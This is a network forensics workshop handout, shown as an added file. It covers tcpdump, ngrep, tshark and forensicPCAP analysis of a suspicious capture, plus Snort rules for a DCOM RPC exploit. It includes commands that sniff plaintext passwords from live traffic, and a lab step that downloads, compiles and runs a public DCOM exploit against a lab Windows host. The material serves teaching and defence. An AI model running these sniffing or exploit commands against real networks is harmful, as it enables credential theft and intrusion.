@@ -1,0 +1,386 @@
+##########
+# VMWare #
+##########
+- For this workshop you'll need the latest version of VMWare Workstation (Windows), Fusion (Mac), or Player.
+
+- http://www.vmware.com/ap/products/player.html
+
+
+- Although you can get the VM to run in VirtualBox, I will not be supporting this configuration for this class.
+
+
+
+#########################
+# Class Virtual Machine #
+#########################
+ 
+ 
+Here is the VMWare virtual machine for the class:
+ 
+https://s3.amazonaws.com/infosecaddictsvirtualmachines/InfoSecAddictsVM.zip
+user:      infosecaddicts
+pass:      infosecaddicts
+
+
+#################
+# PCAP Analysis #
+#################
+---------------------------Type This-----------------------------------
+cd ~/Desktop/
+ 
+mkdir suspiciouspcap/
+ 
+cd suspiciouspcap/
+ 
+wget https://s3.amazonaws.com/infosecaddictsfiles/suspicious-time.pcap
+ 
+wget https://s3.amazonaws.com/infosecaddictsfiles/chaosreader.pl
+ 
+ 
+perl chaosreader.pl suspicious-time.pcap
+ 
+firefox index.html
+ 
+cat index.text | grep -v '"' | grep -oE "([0-9]+\.){3}[0-9]+.*\)"
+ 
+cat index.text | grep -v '"' | grep -oE "([0-9]+\.){3}[0-9]+.*\)" | awk '{print $4, $5, $6}' | sort | uniq -c | sort -nr
+ 
+ 
+for i in session_00[0-9]*.http.html; do srcip=`cat "$i" | grep 'http:\ ' | awk '{print $2}' |  cut -d ':' -f1`; dstip=`cat "$i" | grep 'http:\ ' | awk '{print $4}' |  cut -d ':' -f1`; host=`cat "$i" | grep 'Host:\ ' | sort -u | sed -e 's/Host:\ //g'`; echo "$srcip --> $dstip = $host";  done | sort -u
+------------------------------------------------------------------------
+ 
+ 
+ 
+####################
+# Intro to TCPDump #
+####################
+---------------------------Type This-----------------------------------
+sudo apt-get install tcpdump
+ 
+ 
+ 
+Basic sniffing
+--------------
+---------------------------Type This-----------------------------------
+sudo tcpdump -n
+ 
+ 
+Now lets increase the display resolution of this packet, or get more details about it. The verbose switch comes in handy
+---------------------------Type This-----------------------------------
+sudo tcpdump -v -n
+ 
+ 
+ 
+Getting the ethernet header (link layer headers)
+------------------------------------------------
+In the above examples details of the ethernet header are not printed. Use the -e option to print the ethernet header details as well.
+---------------------------Type This-----------------------------------
+sudo tcpdump -vv -n -e
+------------------------------------------------------------------------
+ 
+Sniffing a particular interface
+-------------------------------
+In order to sniff a particular network interface we must specify it with the -i switch. First lets get the list of available interfaces using the -D switch.
+---------------------------Type This-----------------------------------
+sudo tcpdump -D
+------------------------------------------------------------------------
+ 
+Filtering packets using expressions - Selecting protocols
+---------------------------------------------------------
+---------------------------Type This-----------------------------------
+$ sudo tcpdump -n tcp
+------------------------------------------------------------------------
+ 
+Particular host or port
+-----------------------
+Expressions can be used to specify source ip, destination ip, and port numbers. The next example picks up all those packets with source address 192.168.1.101
+---------------------------Type This-----------------------------------
+$ sudo tcpdump -n 'src 192.168.1.101'
+------------------------------------------------------------------------
+ 
+Next example picks up dns request packets, either those packets which originate from local machine and go to port 53 of some other machine.
+---------------------------Type This-----------------------------------
+$ sudo tcpdump -n 'udp and dst port 53'
+------------------------------------------------------------------------
+ 
+To display the FTP packets coming from 192.168.1.100 to 192.168.1.2
+---------------------------Type This-----------------------------------
+$ sudo tcpdump 'src 192.168.1.100 and dst 192.168.1.2 and port ftp'
+------------------------------------------------------------------------
+ 
+Search the network traffic using grep
+ 
+Grep can be used along with tcpdump to search the network traffic. Here is a very simple example
+---------------------------Type This-----------------------------------
+$ sudo tcpdump -n -A | grep -e 'POST'
+------------------------------------------------------------------------
+ 
+So what is the idea behind searching packets. Well one good thing can be to sniff passwords.
+Here is quick example to sniff passwords using egrep
+ 
+---------------------------Type This-----------------------------------
+tcpdump port http or port ftp or port smtp or port imap or port pop3 -l -A | egrep -i 'pass=|pwd=|log=|login=|user=|username=|pw=|passw=|passwd=|password=|pass:|user:|username:|password:|login:|pass |user ' --color=auto --line-buffered -B20
+------------------------------------------------------------------------
+ 
+ 
+ 
+#########
+# NGrep #
+#########
+ 
+Install ngrep on Ubuntu
+---------------------------Type This-----------------------------------
+$ sudo apt-get install ngrep
+------------------------------------------------------------------------
+ 
+Search network traffic for string "User-Agent: "
+---------------------------Type This-----------------------------------
+$ sudo ngrep -d eth0 "User-Agent: " tcp and port 80
+------------------------------------------------------------------------
+In the above command :
+a) tcp and port 80 - is the bpf filter (Berkeley Packet Filter) , that sniffs only TCP packet with port number 80
+b) The d option specifies the interface to sniff. eth0 in this case.
+c) "User-Agent: " is the string to search for. All packets that have that string are displayed.
+ 
+2. Search network packets for GET or POST requests :
+---------------------------Type This-----------------------------------
+$ sudo ngrep -l -q -d eth0 "^GET |^POST " tcp and port 80
+------------------------------------------------------------------------
+The l option makes the output buffered and the q option is for quiet ( Be quiet; don't output any information other than packet headers and their payloads (if relevant) ).
+ 
+3. ngrep without any options would simply capture all packets.
+---------------------------Type This-----------------------------------
+$ sudo ngrep
+------------------------------------------------------------------------
+ 
+Reference:
+https://dl.packetstormsecurity.net/papers/general/ngreptut.txt
+---------------------------Type This-----------------------------------
+$ sudo ngrep -d eth0 -n 3
+ 
+$ sudo ngrep -d any port 25
+------------------------------------------------------------------------
+ 
+This will let you monitor all activity crossing source or destination port 25
+(SMTP).
+---------------------------Type This-----------------------------------
+$ sudo ngrep -wi -d wlan0 'user|pass' port 6667
+ 
+$ sudo ngrep -wi -d any 'user|pass' port 21
+------------------------------------------------------------------------
+ 
+ 
+ 
+ 
+ 
+#############################
+# PCAP Analysis with tshark #
+#############################
+---------------------------Type This-----------------------------------
+sudo tshark -i eth0 -r suspicious-time.pcap -qz io,phs
+ 
+ 
+tshark -r suspicious-time.pcap | grep 'NB.*20\>' | sed -e 's/<[^>]*>//g' | awk '{print $3,$4,$9}' | sort -u
+ 
+ 
+tshark -r suspicious-time.pcap | grep 'NB.*1e\>' | sed -e 's/<[^>]*>//g' | awk '{print $3,$4,$9}' | sort -u
+ 
+ 
+tshark -r suspicious-time.pcap arp | grep has | awk '{print $3," -> ",$9}' | tr -d '?'
+ 
+ 
+tshark -r suspicious-time.pcap -Tfields -e "eth.src" | sort | uniq
+ 
+ 
+tshark -r suspicious-time.pcap -R "browser.command==1" -Tfields -e "ip.src" -e "browser.server" | uniq
+ 
+tshark -r suspicious-time.pcap -Tfields -e "eth.src" | sort |uniq
+ 
+tshark -r suspicious-time.pcap -qz ip_hosts,tree
+ 
+tshark -r suspicious-time.pcap -R "http.request" -Tfields -e "ip.src" -e "http.user_agent" | uniq
+ 
+tshark -r suspicious-time.pcap -R "dns" -T fields -e "ip.src" -e "dns.flags.response" -e "dns.qry.name"
+ 
+ 
+whois rapidshare.com.eyu32.ru
+ 
+whois sploitme.com.cn
+ 
+ 
+tshark -r suspicious-time.pcap -R http.request  -T fields -e ip.src -e ip.dst -e http.host -e http.request.uri | awk '{print $1," -> ",$2, "\t: ","http://"$3$4}'
+ 
+tshark -r suspicious-time.pcap -R http.request  -T fields -e ip.src -e ip.dst -e http.host -e http.request.uri | awk '{print $1," -> ",$2, "\t: ","http://"$3$4}' | grep -v -e '\/image' -e '.css' -e '.ico' -e google -e 'honeynet.org'
+ 
+tshark -r suspicious-time.pcap -qz http_req,tree
+ 
+tshark -r suspicious-time.pcap -R "data-text-lines contains \"<script\"" -T fields -e frame.number -e ip.src -e ip.dst
+ 
+tshark -r suspicious-time.pcap -R http.request  -T fields -e ip.src -e ip.dst -e http.host -e http.request.uri | awk '{print $1," -> ",$2, "\t: ","http://"$3$4}' | grep -v -e '\/image' -e '.css' -e '.ico'  | grep 10.0.3.15 | sed -e 's/\?[^cse].*/\?\.\.\./g'
+ 
+ 
+ 
+######################################
+# PCAP Analysis with forensicPCAP.py #
+######################################
+---------------------------Type This-----------------------------------
+cd ~/Desktop/suspiciouspcap/
+ 
+wget https://raw.githubusercontent.com/madpowah/ForensicPCAP/master/forensicPCAP.py
+ 
+sudo pip install cmd2==0.7.9
+ 
+ 
+python forensicPCAP.py suspicious-time.pcap
+------------------------------------------------------------------------
+ 
+ 
+---------------------------Type This-----------------------------------
+ForPCAP >>> help
+------------------------------------------------------------------------
+ 
+Prints stats about PCAP
+---------------------------Type This-----------------------------------
+ForPCAP >>> stat
+------------------------------------------------------------------------
+ 
+Prints all DNS requests from the PCAP file. The id before the DNS is the packet's id which can be use with the "show" command.
+---------------------------Type This-----------------------------------
+ForPCAP >>> dns
+ 
+ForPCAP >>> show
+------------------------------------------------------------------------
+ 
+Prints all destination ports from the PCAP file. The id before the DNS is the packet's id which can be use with the "show" command.
+---------------------------Type This-----------------------------------
+ForPCAP >>> dstports
+ 
+ForPCAP >>> show
+---------------------------Type This-----------------------------------
+ 
+Prints the number of ip source and store them.
+---------------------------Type This-----------------------------------
+ForPCAP >>> ipsrc
+ 
+ForPCAP >>> show
+------------------------------------------------------------------------
+ 
+Prints the number of web's requests and store them
+ForPCAP >>> web
+ 
+ForPCAP >>> show
+------------------------------------------------------------------------
+ 
+ 
+Prints the number of mail's requests and store them
+---------------------------Type This-----------------------------------
+ForPCAP >>> mail
+ 
+ForPCAP >>> show
+------------------------------------------------------------------------
+ 
+ 
+ 
+ 
+ 
+#############################
+# Understanding Snort rules #
+#############################
+Field 1: Action - Snort can process events in 1 of 3 ways (alert, log, drop)
+ 
+Field 2: Protocol - Snort understands a few types of traffic (tcp, udp, icmp)
+ 
+Field 3: Source IP (can be a variable like $External_Net, or an IP, or a range)
+ 
+Field 4: Source Port (can be a variable like $WebServer_Ports, or a port number, or a range of ports)
+ 
+Field 5: Traffic Direction (->)
+ 
+Field 6: Destination IP (can be a variable like $External_Net, or an IP, or a range)
+ 
+Field 7: Destination Port (can be a variable like $WebServer_Ports, or a port number, or a range of ports)
+ 
+Field 8: MSG - what is actually displayed on the analysts machine
+ 
+ 
+Let's look at 2 simple rules
+----------------------------------------------------------------------------------
+alert tcp $EXTERNAL_NET any -> $HOME_NET 135 (msg:”NETBIOS DCERPC ISystemActivator \
+bind attempt”; flow:to_server,established; content:”|05|”; distance:0; within:1; \
+content:”|0b|”; distance:1; within:1; byte_test:1,&,1,0,relative; content:”|A0 01 00 \
+00 00 00 00 00 C0 00 00 00 00 00 00 46|”; distance:29; within:16; \
+reference:cve,CAN-2003-0352; classtype:attempted-admin; sid:2192; rev:1;)
+ 
+alert tcp $EXTERNAL_NET any -> $HOME_NET 445 (msg:”NETBIOS SMB DCERPC ISystemActivator bind \
+attempt”; flow:to_server,established; content:”|FF|SMB|25|”; nocase; offset:4; \
+depth:5; content:”|26 00|”; distance:56; within:2; content:”|5c \
+00|P|00|I|00|P|00|E|00 5c 00|”; nocase; distance:5; within:12; content:”|05|”; \
+distance:0; within:1; content:”|0b|”; distance:1; within:1; \
+byte_test:1,&,1,0,relative; content:”|A0 01 00 00 00 00 00 00 C0 00 00 00 00 00 00 \
+46|”; distance:29; within:16; reference:cve,CAN-2003-0352; classtype:attempted-admin; \
+sid:2193; rev:1;)
+----------------------------------------------------------------------------------
+ 
+ 
+ 
+From your Linux machine ping your Windows machine
+---------------------------Type This-----------------------------------
+ping 192.168.150.1
+-----------------------------------------------------------------------
+ 
+ 
+Start wireshark and let's create some simple filters:
+ 
+Filter 1:
+---------------------------Type This-----------------------------------
+ip.addr==192.168.150.1
+-----------------------------------------------------------------------
+ 
+Filter 2:
+---------------------------Type This-----------------------------------
+ip.addr==192.168.150.1 && icmp
+-----------------------------------------------------------------------
+ 
+ 
+Filter 3:
+---------------------------Type This-----------------------------------
+ip.addr==192.168.150.1 && !(tcp.port==22)
+-----------------------------------------------------------------------
+Now stop your capture and restart it (make sure you keep the filter)
+ 
+ 
+ 
+ 
+Back to your Linux machine:
+[ CTRL-C ] - to stop your ping
+---------------------------Type This-----------------------------------
+wget http://downloads.securityfocus.com/vulnerabilities/exploits/oc192-dcom.c
+ 
+ 
+gcc -o exploit oc192-dcom.c
+ 
+./exploit
+ 
+ 
+./exploit -d 192.168.150.1 -t 0
+ -----------------------------------------------------------------------
+ 
+ 
+ 
+Now go back to WireShark and stop the capture.
+
+
+
+###############################################
+# Packet Analysis/Network Forensics Challenge #
+###############################################
+
+In order to receive your certificate of proficiency you must complete all of the tasks covered in the Packet Analysis/Network Forensics pastebin (http://pastebin.com/SwgnkAhQ).
+
+Submit the results via email in an MS Word document with (naming convention example: YourFirstName-YourLastName-PA-NF-Challenge.docx)
+
+
+
+
+IMPORTANT NOTE:
+Your homework/challenge must be submitted via email to both (joe-at-strategicsec-.-com and kasheia-at-strategicsec-.-com) by Sunday October 23rd at midnight EST.
